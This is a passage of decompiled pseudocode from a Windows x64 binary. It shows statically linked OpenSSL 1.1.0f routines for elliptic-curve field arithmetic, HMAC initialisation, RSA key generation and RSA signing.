    v57 = v9 ^ v107;
    v70 = v9 ^ v5;
    v10 = v8 & (v108 ^ HIDWORD(v82));
    v47 = v10 ^ HIDWORD(v82);
    v59 = v10 ^ v108;
    v11 = v8 & (v109 ^ v83);
    v49 = v11 ^ v83;
    v60 = v11 ^ v109;
    v12 = v8 & (v110 ^ HIDWORD(v83));
    v50 = v12 ^ HIDWORD(v83);
    v61 = v12 ^ v110;
    v13 = v8 & (v111 ^ v84);
    v51 = v13 ^ v84;
    v62 = v13 ^ v111;
    v14 = v8 & (v112 ^ HIDWORD(v84));
    v52 = v14 ^ HIDWORD(v84);
    v63 = v14 ^ v112;
    v15 = v8 & (v113 ^ v85);
    v53 = v15 ^ v85;
    v64 = v15 ^ v113;
    v16 = v8 & (v114 ^ HIDWORD(v85));
    v54 = v16 ^ HIDWORD(v85);
    v65 = v16 ^ v114;
    v17 = v8 & (v115 ^ v86);
    v55 = v17 ^ v86;
    v66 = v17 ^ v115;
    v18 = v8 & (v116 ^ HIDWORD(v86));
    v19 = v18 ^ v116;
    v56 = v18 ^ HIDWORD(v86);
    v20 = v8 & (v72 ^ v7);
    v67 = v19;
    v46 = v20 ^ v72;
    v58 = v20 ^ v7;
    v21 = v8 & (HIDWORD(v77) ^ HIDWORD(v72));
    LODWORD(v77) = v58;
    v48 = v21 ^ HIDWORD(v72);
    HIDWORD(v77) ^= v21;
    v22 = v8 & (v78 ^ v73);
    v23 = v22 ^ v73;
    LODWORD(v78) = v22 ^ v78;
    v24 = v8 & (HIDWORD(v78) ^ HIDWORD(v73));
    v25 = v24 ^ HIDWORD(v73);
    HIDWORD(v78) ^= v24;
    v26 = v8 & (v79 ^ v74);
    v27 = v26 ^ v74;
    LODWORD(v79) = v26 ^ v79;
    v28 = v8 & (HIDWORD(v79) ^ HIDWORD(v74));
    v29 = v28 ^ HIDWORD(v74);
    HIDWORD(v79) ^= v28;
    v30 = v8 & (v80 ^ v75);
    v31 = v30 ^ v75;
    LODWORD(v80) = v30 ^ v80;
    v32 = v8 & (HIDWORD(v80) ^ HIDWORD(v75));
    v33 = v32 ^ HIDWORD(v75);
    HIDWORD(v80) ^= v32;
    v34 = v8 & (v81 ^ v76);
    v35 = v34 ^ v76;
    LODWORD(v81) = v34 ^ v81;
    v36 = v8 & (HIDWORD(v81) ^ HIDWORD(v76));
    v87 = v57 - v58;
    v88 = v59 - HIDWORD(v77);
    v89 = v60 - v78;
    v90 = v61 - HIDWORD(v78);
    v91 = v62 - v79;
    HIDWORD(v81) ^= v36;
    v92 = v63 - HIDWORD(v79);
    v93 = v64 - v80;
    v94 = v65 - HIDWORD(v80);
    v95 = v66 - v81;
    v96 = v67 - HIDWORD(v81);
    v97 = v70 - v46;
    v98 = v47 - v48;
    v99 = v49 - v23;
    v100 = v50 - v25;
    v101 = v51 - v27;
    v102 = v52 - v29;
    v103 = v53 - v31;
    v104 = v54 - v33;
    v105 = v55 - v35;
    v106 = v56 - (v36 ^ HIDWORD(v76));
    LODWORD(v82) = v46 + v70;
    HIDWORD(v82) = v48 + v47;
    LODWORD(v83) = v23 + v49;
    HIDWORD(v83) = v25 + v50;
    LODWORD(v84) = v27 + v51;
    HIDWORD(v84) = v29 + v52;
    LODWORD(v85) = v31 + v53;
    HIDWORD(v85) = v33 + v54;
    LODWORD(v86) = v35 + v55;
    HIDWORD(v86) = (v36 ^ HIDWORD(v76)) + v56;
    LODWORD(v72) = v58 + v57;
    HIDWORD(v72) = v59 + HIDWORD(v77);
    LODWORD(v73) = v60 + v78;
    HIDWORD(v73) = v61 + HIDWORD(v78);
    LODWORD(v74) = v62 + v79;
    HIDWORD(v74) = HIDWORD(v79) + v63;
    LODWORD(v75) = v80 + v64;
    HIDWORD(v75) = HIDWORD(v80) + v65;
    LODWORD(v76) = v81 + v66;
    HIDWORD(v76) = HIDWORD(v81) + v67;
    sub_1400682A0(&v77, &v87, (int *)&v82);
    sub_1400682A0(&v72, (int *)&v72, &v97);
    sub_140068DC0(&v87, &v97);
    sub_140068DC0(&v97, (int *)&v82);
    v107 = v77 + v72;
    v108 = HIDWORD(v77) + HIDWORD(v72);
    v109 = v78 + v73;
    v110 = HIDWORD(v73) + HIDWORD(v78);
    v111 = v74 + v79;
    LODWORD(v74) = v79 - v74;
    v112 = HIDWORD(v74) + HIDWORD(v79);
    HIDWORD(v74) = HIDWORD(v79) - HIDWORD(v74);
    v113 = v75 + v80;
    LODWORD(v75) = v80 - v75;
    v114 = HIDWORD(v75) + HIDWORD(v80);
    HIDWORD(v75) = HIDWORD(v80) - HIDWORD(v75);
    v115 = v76 + v81;
    LODWORD(v76) = v81 - v76;
    v116 = HIDWORD(v76) + HIDWORD(v81);
    LODWORD(v72) = v77 - v72;
    HIDWORD(v72) = HIDWORD(v77) - HIDWORD(v72);
    LODWORD(v73) = v78 - v73;
    HIDWORD(v76) = HIDWORD(v81) - HIDWORD(v76);
    HIDWORD(v73) = HIDWORD(v78) - HIDWORD(v73);
    sub_1400682A0(&v82, &v97, &v87);
    v104 -= v94;
    v105 -= v95;
    v37 = v87;
    v38 = v88;
    v39 = v89;
    v40 = v90;
    v41 = v91;
    v42 = v92;
    v43 = v93;
    v97 -= v87;
    v98 -= v88;
    v99 -= v89;
    v100 -= v90;
    v101 -= v91;
    v102 -= v92;
    v103 -= v93;
    v106 -= v96;
    sub_140068DC0(&v72, (int *)&v72);
    sub_140068BC0(&v77, &v97);
    sub_140068DC0(&v107, &v107);
    v94 += HIDWORD(v80);
    v95 += v81;
    v96 += HIDWORD(v81);
    v87 = v77 + v37;
    v88 = HIDWORD(v77) + v38;
    v89 = v78 + v39;
    v90 = HIDWORD(v78) + v40;
    v91 = v79 + v41;
    v92 = HIDWORD(v79) + v42;
    v93 = v80 + v43;
    sub_1400682A0(&v77, Src, (int *)&v72);
    sub_1400682A0(&v72, &v97, &v87);
    v44 = v68 - 1 < 0;
    v6 = --v68;
    if ( v44 )
      break;
    v5 = v82;
    v7 = v77;
    v4 = v69;
  }
  LODWORD(v82) = -v69 & (v107 ^ v82) ^ v82;
  HIDWORD(v82) ^= -v69 & (v108 ^ HIDWORD(v82));
  LODWORD(v83) = -v69 & (v109 ^ v83) ^ v83;
  HIDWORD(v83) ^= -v69 & (v110 ^ HIDWORD(v83));
  LODWORD(v84) = -v69 & (v111 ^ v84) ^ v84;
  HIDWORD(v84) ^= -v69 & (v112 ^ HIDWORD(v84));
  LODWORD(v85) = -v69 & (v113 ^ v85) ^ v85;
  HIDWORD(v85) ^= -v69 & (v114 ^ HIDWORD(v85));
  LODWORD(v86) = -v69 & (v115 ^ v86) ^ v86;
  HIDWORD(v86) ^= -v69 & (v116 ^ HIDWORD(v86));
  LODWORD(v72) = -v69 & (v72 ^ v77) ^ v72;
  HIDWORD(v72) ^= -v69 & (HIDWORD(v77) ^ HIDWORD(v72));
  LODWORD(v73) = -v69 & (v78 ^ v73) ^ v73;
  HIDWORD(v73) ^= -v69 & (HIDWORD(v78) ^ HIDWORD(v73));
  LODWORD(v74) = -v69 & (v79 ^ v74) ^ v74;
  HIDWORD(v74) ^= -v69 & (HIDWORD(v79) ^ HIDWORD(v74));
  LODWORD(v75) = -v69 & (v80 ^ v75) ^ v75;
  HIDWORD(v75) ^= -v69 & (HIDWORD(v80) ^ HIDWORD(v75));
  LODWORD(v76) = -v69 & (v81 ^ v76) ^ v76;
  HIDWORD(v76) ^= -v69 & (HIDWORD(v81) ^ HIDWORD(v76));
  sub_140068020(&v72, (int *)&v72);
  sub_1400682A0(&v82, (int *)&v82, (int *)&v72);
  return sub_1400698D0(a1, (int *)&v82);
}
// 14006A810: using guessed type int Src[10];

//----- (000000014006B060) ----------------------------------------------------
int __fastcall sub_14006B060(const void **a1, __int64 a2)
{
  return sub_140047390(a1, a2);
}

//----- (000000014006B080) ----------------------------------------------------
__int64 __fastcall sub_14006B080(__int64 a1)
{
  return sub_140047450(a1);
}

//----- (000000014006B0A0) ----------------------------------------------------
__int64 __fastcall sub_14006B0A0(__int64 a1, _BYTE *a2, int a3)
{
  return sub_1400475D0(a1, a2, a3);
}

//----- (000000014006B0C0) ----------------------------------------------------
void *__fastcall sub_14006B0C0(int *a1, const void *a2, int a3, __int64 a4, __int64 a5, void *a6, _DWORD *a7)
{
  void *v7; // rsi
  _QWORD *v11; // rax
  _QWORD *v12; // rbx
  void *v14; // rax

  v7 = &unk_1401433B0;
  if ( a6 )
    v7 = a6;
  v11 = sub_14001DC20(0xA8ui64);
  v12 = v11;
  if ( v11 && !(unsigned int)sub_14006B3C0((__int64)v11) )
  {
    sub_14006B2F0(v12);
    v12 = 0i64;
LABEL_6:
    sub_14006B2F0(v12);
    return 0i64;
  }
  if ( !v12 )
    goto LABEL_6;
  if ( !a2 )
  {
    v14 = &unk_14010E460;
    if ( a3 )
      v14 = 0i64;
    a2 = v14;
  }
  if ( !sub_14006B5B0((__int64)v12, a2, a3, a1, 0i64)
    || !*v12
    || !(unsigned int)sub_14006DD90(v12[1])
    || !sub_14006B500((__int64)v12, (__int64)v7, a7) )
  {
    goto LABEL_6;
  }
  sub_14006B2F0(v12);
  return v7;
}

//----- (000000014006B1E0) ----------------------------------------------------
__int64 __fastcall sub_14006B1E0(__int64 a1, __int64 a2)
{
  if ( (unsigned int)sub_14006B3C0(a1)
    && (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 16), *(_QWORD *)(a2 + 16))
    && (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 24), *(_QWORD *)(a2 + 24))
    && (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 8), *(_QWORD *)(a2 + 8)) )
  {
    *(_OWORD *)(a1 + 36) = *(_OWORD *)(a2 + 36);
    *(_OWORD *)(a1 + 52) = *(_OWORD *)(a2 + 52);
    *(_OWORD *)(a1 + 68) = *(_OWORD *)(a2 + 68);
    *(_OWORD *)(a1 + 84) = *(_OWORD *)(a2 + 84);
    *(_OWORD *)(a1 + 100) = *(_OWORD *)(a2 + 100);
    *(_OWORD *)(a1 + 116) = *(_OWORD *)(a2 + 116);
    *(_OWORD *)(a1 + 132) = *(_OWORD *)(a2 + 132);
    *(_OWORD *)(a1 + 148) = *(_OWORD *)(a2 + 148);
    *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
    *(_QWORD *)a1 = *(_QWORD *)a2;
    return 1i64;
  }
  else
  {
    sub_14006E000(*(_QWORD *)(a1 + 16));
    sub_14006E000(*(_QWORD *)(a1 + 24));
    sub_14006E000(*(_QWORD *)(a1 + 8));
    *(_QWORD *)a1 = 0i64;
    *(_DWORD *)(a1 + 32) = 0;
    sub_140023440(a1 + 36, 128i64);
    return 0i64;
  }
}

//----- (000000014006B2F0) ----------------------------------------------------
void __fastcall sub_14006B2F0(_QWORD *a1)
{
  if ( a1 )
  {
    sub_14006E000(a1[2]);
    sub_14006E000(a1[3]);
    sub_14006E000(a1[1]);
    *a1 = 0i64;
    *((_DWORD *)a1 + 8) = 0;
    sub_140023440((__int64)a1 + 36, 128i64);
    sub_14006DF90((void *)a1[2]);
    sub_14006DF90((void *)a1[3]);
    sub_14006DF90((void *)a1[1]);
    sub_14001D930(a1);
  }
}

//----- (000000014006B370) ----------------------------------------------------
_QWORD *__fastcall sub_14006B370()
{
  int v0; // eax
  _QWORD *v1; // rax
  _QWORD *v2; // rbx

  v1 = sub_14001DC20((unsigned int)(v0 + 136));
  v2 = v1;
  if ( !v1 || (unsigned int)sub_14006B3C0((__int64)v1) )
    return v2;
  sub_14006B2F0(v2);
  return 0i64;
}
// 14006B383: variable 'v0' is possibly undefined

//----- (000000014006B3C0) ----------------------------------------------------
__int64 __fastcall sub_14006B3C0(__int64 a1)
{
  void *v2; // rax
  void *v3; // rax
  void *v4; // rax

  sub_14006E000(*(_QWORD *)(a1 + 16));
  sub_14006E000(*(_QWORD *)(a1 + 24));
  sub_14006E000(*(_QWORD *)(a1 + 8));
  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 32) = 0;
  sub_140023440(a1 + 36, 128i64);
  if ( (*(_QWORD *)(a1 + 16) || (v2 = sub_14006DFD0(), (*(_QWORD *)(a1 + 16) = v2) != 0i64))
    && (*(_QWORD *)(a1 + 24) || (v3 = sub_14006DFD0(), (*(_QWORD *)(a1 + 24) = v3) != 0i64))
    && (*(_QWORD *)(a1 + 8) || (v4 = sub_14006DFD0(), (*(_QWORD *)(a1 + 8) = v4) != 0i64)) )
  {
    *(_QWORD *)a1 = 0i64;
    return 1i64;
  }
  else
  {
    sub_14006E000(*(_QWORD *)(a1 + 16));
    sub_14006E000(*(_QWORD *)(a1 + 24));
    sub_14006E000(*(_QWORD *)(a1 + 8));
    *(_QWORD *)a1 = 0i64;
    *(_DWORD *)(a1 + 32) = 0;
    sub_140023440(a1 + 36, 128i64);
    return 0i64;
  }
}

//----- (000000014006B4B0) ----------------------------------------------------
void __fastcall sub_14006B4B0(__int64 *a1, int a2)
{
  sub_1400252B0(a1[2], a2);
  sub_1400252B0(a1[3], a2);
  sub_1400252B0(a1[1], a2);
}

//----- (000000014006B500) ----------------------------------------------------
_BOOL8 __fastcall sub_14006B500(__int64 a1, __int64 a2, _DWORD *a3)
{
  int v7[4]; // [rsp+20h] [rbp-78h] BYREF
  char v8[64]; // [rsp+30h] [rbp-68h] BYREF

  return *(_QWORD *)a1
      && (unsigned int)sub_14006DA80(*(__int64 **)(a1 + 8), (__int64)v8, v7)
      && (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 8), *(_QWORD *)(a1 + 24))
      && (unsigned int)sub_14006DD90(*(_QWORD *)(a1 + 8))
      && (unsigned int)sub_14006DA80(*(__int64 **)(a1 + 8), a2, a3);
}
// 14006B500: using guessed type int var_78[4];
// 14006B500: using guessed type char var_68[64];

//----- (000000014006B5B0) ----------------------------------------------------
_BOOL8 __fastcall sub_14006B5B0(__int64 a1, const void *a2, int a3, int *a4, __int64 a5)
{
  __int64 v5; // rdi
  size_t v6; // rsi
  int *v7; // rbp
  _BOOL8 result; // rax
  int v11; // r15d
  _DWORD *v12; // r14
  __int64 v13; // rdx
  __int64 v14; // rsi
  __int64 v15; // r14
  char *v16; // rcx
  char *v17; // rcx
  char v18[128]; // [rsp+20h] [rbp-C8h] BYREF

  v5 = 0i64;
  v6 = a3;
  v7 = a4;
  result = 0i64;
  if ( !a4 )
  {
    v7 = *(int **)a1;
    if ( !*(_QWORD *)a1 )
      return result;
LABEL_7:
    if ( a2 )
    {
      v11 = sub_1400252D0((__int64)v7);
      if ( v11 > 128 )
        sub_1400234A0(
          "assertion failed: j <= (int)sizeof(ctx->key)",
          "..\\..\\openssl-1.1.0f\\crypto\\hmac\\hmac.c",
          40i64);
      if ( v11 >= (int)v6 )
      {
        if ( (unsigned int)v6 > 0x80 )
          return 0i64;
        memmove((void *)(a1 + 36), a2, v6);
        v12 = (_DWORD *)(a1 + 32);
        *(_DWORD *)(a1 + 32) = v6;
      }
      else
      {
        if ( !(unsigned int)sub_14006DB20(*(_QWORD *)(a1 + 8), v7, a5) )
          return 0i64;
        if ( !(unsigned int)sub_14006DD90(*(_QWORD *)(a1 + 8)) )
          return 0i64;
        v12 = (_DWORD *)(a1 + 32);
        if ( !(unsigned int)sub_14006DA80(*(__int64 **)(a1 + 8), a1 + 36, (_DWORD *)(a1 + 32)) )
          return 0i64;
      }
      if ( *v12 != 128 )
        memset((void *)((unsigned int)*v12 + a1 + 36), 0, (unsigned int)(128 - *v12));
    }
    else if ( !result )
    {
      return (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 8), *(_QWORD *)(a1 + 16)) != 0;
    }
    v13 = 0i64;
    v14 = a1 - (_QWORD)v18 + 36;
    v15 = a1 - (_QWORD)v18 + 37;
    do
    {
      v16 = &v18[v13];
      v13 += 2i64;
      *v16 = v16[v14] ^ 0x36;
      v16[1] = v16[v15] ^ 0x36;
    }
    while ( v13 < 128 );
    if ( !(unsigned int)sub_14006DB20(*(_QWORD *)(a1 + 16), v7, a5) )
      return 0i64;
    sub_1400252D0((__int64)v7);
    if ( !(unsigned int)sub_14006DD90(*(_QWORD *)(a1 + 16)) )
      return 0i64;
    do
    {
      v17 = &v18[v5];
      v5 += 2i64;
      *v17 = v17[v14] ^ 0x5C;
      v17[1] = v17[v15] ^ 0x5C;
    }
    while ( v5 < 128 );
    if ( !(unsigned int)sub_14006DB20(*(_QWORD *)(a1 + 24), v7, a5) )
      return 0i64;
    sub_1400252D0((__int64)v7);
    if ( !(unsigned int)sub_14006DD90(*(_QWORD *)(a1 + 24)) )
      return 0i64;
    return (unsigned int)sub_14006DDB0(*(_QWORD **)(a1 + 8), *(_QWORD *)(a1 + 16)) != 0;
  }
  if ( a4 == *(int **)a1 || a2 && a3 >= 0 )
  {
    LODWORD(result) = 1;
    *(_QWORD *)a1 = a4;
    goto LABEL_7;
  }
  return result;
}

//----- (000000014006B820) ----------------------------------------------------
__int64 __fastcall sub_14006B820(_QWORD *a1)
{
  if ( *a1 )
    return sub_14006DD90(a1[1]);
  else
    return 0i64;
}

//----- (000000014006B850) ----------------------------------------------------
__int64 __fastcall sub_14006B850(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  __int64 (*v4)(void); // r10

  v4 = *(__int64 (**)(void))(*(_QWORD *)(a1 + 8) + 104i64);
  if ( v4 )
    return v4();
  else
    return sub_14006B880(a1, a2, a3, a4);
}

//----- (000000014006B880) ----------------------------------------------------
__int64 __fastcall sub_14006B880(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  int v4; // eax
  unsigned int v5; // ebp
  unsigned int v10; // r12d
  int *v11; // rsi
  int *v12; // rax
  int v13; // eax
  int v14; // r13d
  int v15; // r15d
  _DWORD *v16; // rax
  _DWORD *v17; // rax
  _DWORD *v18; // rax
  _DWORD *v19; // rax
  _DWORD *v20; // rax
  _DWORD *v21; // rax
  _DWORD *v22; // rax
  _DWORD *v23; // rax
  void **v24; // rax
  int v25; // eax
  void **v26; // rax
  __int64 v28; // rcx
  void **v29; // rax
  void **v30; // rax
  __int64 *v31; // rax
  __int64 *v32; // rdi
  _DWORD *v33; // rax
  __int64 *v34; // rcx
  __int64 *v35; // rax
  __int64 *v36; // rdi
  __int64 *v37; // rax
  __int64 *v38; // rdi
  _DWORD *v39; // rax
  _QWORD *v41; // [rsp+30h] [rbp-48h]
  _QWORD *v42; // [rsp+38h] [rbp-40h]
  _QWORD *v43; // [rsp+40h] [rbp-38h]

  v5 = 0;
  v10 = 0;
  v11 = 0i64;
  if ( a2 >= 16 )
  {
    v12 = (int *)sub_140027CD0();
    v11 = v12;
    if ( v12 )
    {
      sub_140027D40(v12);
      v43 = sub_140027C40(v11);
      v42 = sub_140027C40(v11);
      v41 = sub_140027C40(v11);
      if ( sub_140027C40(v11) )
      {
        v13 = (a2 + 1) / 2;
        v14 = a2 - v13;
        v15 = v13;
        if ( *(_QWORD *)(a1 + 24) || (v16 = sub_140027200(), (*(_QWORD *)(a1 + 24) = v16) != 0i64) )
        {
          if ( *(_QWORD *)(a1 + 40) || (v17 = sub_1400273B0(), (*(_QWORD *)(a1 + 40) = v17) != 0i64) )
          {
            if ( *(_QWORD *)(a1 + 32) || (v18 = sub_140027200(), (*(_QWORD *)(a1 + 32) = v18) != 0i64) )
            {
              if ( *(_QWORD *)(a1 + 48) || (v19 = sub_1400273B0(), (*(_QWORD *)(a1 + 48) = v19) != 0i64) )
              {
                if ( *(_QWORD *)(a1 + 56) || (v20 = sub_1400273B0(), (*(_QWORD *)(a1 + 56) = v20) != 0i64) )
                {
                  if ( *(_QWORD *)(a1 + 64) || (v21 = sub_1400273B0(), (*(_QWORD *)(a1 + 64) = v21) != 0i64) )
                  {
                    if ( *(_QWORD *)(a1 + 72) || (v22 = sub_1400273B0(), (*(_QWORD *)(a1 + 72) = v22) != 0i64) )
                    {
                      if ( *(_QWORD *)(a1 + 80) || (v23 = sub_1400273B0(), (*(_QWORD *)(a1 + 80) = v23) != 0i64) )
                      {
                        if ( sub_140026E90(*(_QWORD *)(a1 + 32), a3)
                          && (unsigned int)sub_1400ADE40(*(__int64 ***)(a1 + 48), v15, 0, 0i64, 0i64, a4) )
                        {
                          do
                          {
                            v24 = sub_140027650();
                            if ( !(unsigned int)sub_140041AC0((__int64)v41, *(_QWORD *)(a1 + 48), (__int64)v24)
                              || !(unsigned int)sub_14006FCE0((__int64)v42, (__int64)v41, *(_QWORD *)(a1 + 32), v11) )
                            {
                              break;
                            }
                            if ( sub_140027110((__int64)v42) )
                            {
                              if ( (unsigned int)sub_1400ADDE0(a4, 3u, 0) )
                              {
                                while ( (unsigned int)sub_1400ADE40(*(__int64 ***)(a1 + 56), v14, 0, 0i64, 0i64, a4) )
                                {
                                  if ( (unsigned int)sub_140026AB0(*(_QWORD *)(a1 + 48), *(__int64 **)(a1 + 56)) )
                                  {
                                    v26 = sub_140027650();
                                    if ( !(unsigned int)sub_140041AC0((__int64)v41, *(_QWORD *)(a1 + 56), (__int64)v26)
                                      || !(unsigned int)sub_14006FCE0(
                                                          (__int64)v42,
                                                          (__int64)v41,
                                                          *(_QWORD *)(a1 + 32),
                                                          v11) )
                                    {
                                      goto LABEL_54;
                                    }
                                    if ( sub_140027110((__int64)v42) )
                                    {
                                      if ( (unsigned int)sub_1400ADDE0(a4, 3u, 1u) )
                                      {
                                        if ( (int)sub_140026AB0(*(_QWORD *)(a1 + 48), *(__int64 **)(a1 + 56)) < 0 )
                                        {
                                          v28 = *(_QWORD *)(a1 + 48);
                                          *(_QWORD *)(a1 + 48) = *(_QWORD *)(a1 + 56);
                                          *(_QWORD *)(a1 + 56) = v28;
                                        }
                                        if ( (unsigned int)sub_14006E5B0(
                                                             *(_QWORD *)(a1 + 24),
                                                             *(_QWORD *)(a1 + 48),
                                                             *(_QWORD *)(a1 + 56),
                                                             v11) )
                                        {
                                          v29 = sub_140027650();
                                          if ( (unsigned int)sub_140041AC0(
                                                               (__int64)v42,
                                                               *(_QWORD *)(a1 + 48),
                                                               (__int64)v29) )
                                          {
                                            v30 = sub_140027650();
                                            if ( (unsigned int)sub_140041AC0(
                                                                 (__int64)v41,
                                                                 *(_QWORD *)(a1 + 56),
                                                                 (__int64)v30) )
                                            {
                                              if ( (unsigned int)sub_14006E5B0(
                                                                   (__int64)v43,
                                                                   (__int64)v42,
                                                                   (__int64)v41,
                                                                   v11) )
                                              {
                                                v31 = (__int64 *)sub_140027200();
                                                v32 = v31;
                                                if ( v31 )
                                                {
                                                  sub_140027660((__int64)v31, (__int64)v43, 4);
                                                  v33 = sub_14006FDD0(
                                                          *(_DWORD **)(a1 + 40),
                                                          *(_QWORD *)(a1 + 32),
                                                          v32,
                                                          v11);
                                                  v34 = v32;
                                                  if ( v33 )
                                                  {
                                                    sub_140026FF0(v32);
                                                    v35 = (__int64 *)sub_140027200();
                                                    v36 = v35;
                                                    if ( !v35 )
                                                      goto LABEL_54;
                                                    sub_140027660((__int64)v35, *(_QWORD *)(a1 + 40), 4);
                                                    if ( (unsigned int)sub_140041D70(
                                                                         0i64,
                                                                         *(_QWORD *)(a1 + 64),
                                                                         (__int64)v36,
                                                                         (__int64)v42,
                                                                         v11)
                                                      && (unsigned int)sub_140041D70(
                                                                         0i64,
                                                                         *(_QWORD *)(a1 + 72),
                                                                         (__int64)v36,
                                                                         (__int64)v41,
                                                                         v11) )
                                                    {
                                                      sub_140026FF0(v36);
                                                      v37 = (__int64 *)sub_140027200();
                                                      v38 = v37;
                                                      if ( !v37 )
                                                        goto LABEL_54;
                                                      sub_140027660((__int64)v37, *(_QWORD *)(a1 + 48), 4);
                                                      v39 = sub_14006FDD0(
                                                              *(_DWORD **)(a1 + 80),
                                                              *(_QWORD *)(a1 + 56),
                                                              v38,
                                                              v11);
                                                      v34 = v38;
                                                      if ( v39 )
                                                      {
                                                        sub_140026FF0(v38);
                                                        v5 = 1;
                                                        goto LABEL_55;
                                                      }
                                                    }
                                                    else
                                                    {
                                                      v34 = v36;
                                                    }
                                                  }
                                                  sub_140026FF0(v34);
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                      goto LABEL_54;
                                    }
                                    if ( !(unsigned int)sub_1400ADDE0(a4, 2u, v10++) )
                                      goto LABEL_54;
                                  }
                                }
                              }
                              break;
                            }
                            v25 = sub_1400ADDE0(a4, 2u, v10++);
                          }
                          while ( v25 && (unsigned int)sub_1400ADE40(*(__int64 ***)(a1 + 48), v15, 0, 0i64, 0i64, a4) );
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
LABEL_54:
    sub_140024610(4, 129, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_gen.c", 190);
LABEL_55:
    if ( v11 )
      sub_140027B60((__int64)v11);
  }
  else
  {
    sub_140024610(v4 - 76, v4 + 49, v4 + 40, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_gen.c", 52);
  }
  sub_140027BE0((__int64)v11);
  return v5;
}
// 14006B8C9: variable 'v4' is possibly undefined

//----- (000000014006BD70) ----------------------------------------------------
__int64 __fastcall sub_14006BD70(__int64 a1, __int64 a2, int a3, __int64 a4, int *a5, __int64 a6)
{
  unsigned int v6; // ebp
  __int64 v8; // rsi
  void *v9; // rdi
  __int64 (__fastcall *v10)(__int64, __int64); // r10
  signed int v12; // ebx
  int v13; // eax
  int v14; // eax
  int v15; // [rsp+30h] [rbp-28h] BYREF
  void *v16; // [rsp+38h] [rbp-20h] BYREF

  v6 = 0;
  v15 = 0;
  v8 = a2;
  v16 = 0i64;
  v9 = 0i64;
  v10 = *(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)(a6 + 8) + 88i64);
  if ( v10 )
    return v10(a1, a2);
  if ( (_DWORD)a1 == 114 )
  {
    if ( a3 != 36 )
    {
      sub_140024610(4, 117, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 88);
      return 0i64;
    }
    v12 = 36;
    goto LABEL_9;
  }
  v13 = sub_14006BF20(&v16, &v15, a1, a2, a3);
  v9 = v16;
  v12 = v15;
  if ( v13 )
  {
    v8 = (__int64)v16;
LABEL_9:
    if ( v12 <= (int)(sub_14005E580(a6) - 11) )
    {
      v14 = sub_14005E320((unsigned int)v12, v8, a4, a6);
      if ( v14 > 0 )
      {
        v6 = 1;
        *a5 = v14;
      }
    }
    else
    {
      sub_140024610(4, 117, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 100);
    }
  }
  sub_14001DA40(v9, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 0x70u);
  return v6;
}

//----- (000000014006BED0) ----------------------------------------------------
__int64 __fastcall sub_14006BED0(unsigned int a1, _QWORD *a2, unsigned int a3, __int64 a4, unsigned int a5, __int64 a6)
{
  __int64 (*v6)(void); // r11

  v6 = *(__int64 (**)(void))(*(_QWORD *)(a6 + 8) + 96i64);
  if ( v6 )
    return v6();
  else
    return sub_14006C040(a1, a2, a3, 0i64, 0i64, a4, a5, a6);
}

//----- (000000014006BF20) ----------------------------------------------------
__int64 __fastcall sub_14006BF20(_QWORD *a1, int *a2, unsigned int a3, __int64 a4, int a5)
{
  __int64 result; // rax
  int v9; // ecx
  unsigned __int8 *v10; // [rsp+30h] [rbp-58h] BYREF
  __int64 v11[2]; // [rsp+38h] [rbp-50h] BYREF
  int v12; // [rsp+48h] [rbp-40h] BYREF
  __int64 v13; // [rsp+50h] [rbp-38h]
  char **v14; // [rsp+58h] [rbp-30h] BYREF
  int v15; // [rsp+68h] [rbp-20h] BYREF
  __int64 v16; // [rsp+70h] [rbp-18h]

  v10 = 0i64;
  v11[0] = (__int64)&v14;
  v14 = sub_14002C0F0(a3);
  if ( !v14 )
  {
    sub_140024610(4, 146, 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 44);
    return 0i64;
  }
  if ( sub_14002BF00((__int64)v14) )
  {
    v12 = 5;
    v13 = 0i64;
    *(_QWORD *)(v11[0] + 8) = &v12;
    v11[1] = (__int64)&v15;
    v15 = a5;
    v16 = a4;
    v9 = sub_1400A2620((unsigned int *)v11, &v10);
    if ( v9 < 0 )
      return 0i64;
    *a1 = v10;
    result = 1i64;
    *a2 = v9;
  }
  else
  {
    sub_140024610(4, 146, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 49);
    return 0i64;
  }
  return result;
}

//----- (000000014006C040) ----------------------------------------------------
__int64 __fastcall sub_14006C040(
        unsigned int a1,
        _QWORD *a2,
        unsigned int a3,
        _OWORD *a4,
        size_t *a5,
        __int64 a6,
        size_t a7,
        __int64 a8)
{
  size_t v9; // rbx
  int v12; // r12d
  void *v13; // r13
  _BYTE *v15; // rax
  _BYTE *v16; // rdi
  int v17; // eax
  unsigned __int64 v18; // rbp
  unsigned int v19; // ebx
  char *v20; // rax
  __int64 v21; // rax
  unsigned int v22; // eax
  int v23; // eax
  int v24; // [rsp+20h] [rbp-48h]
  int v25; // [rsp+30h] [rbp-38h] BYREF
  void *Buf1; // [rsp+38h] [rbp-30h] BYREF

  v9 = a3;
  v25 = 0;
  Buf1 = 0i64;
  v12 = 0;
  v13 = 0i64;
  if ( a7 != (int)sub_14005E580(a8) )
  {
    sub_140024610(4, 145, 119, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 132);
    return 0i64;
  }
  v15 = sub_14001D8E0(a7);
  v16 = v15;
  if ( !v15 )
  {
    sub_140024610(4, 145, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_sign.c", 139);
LABEL_42:
    v19 = 0;
    goto LABEL_43;
  }
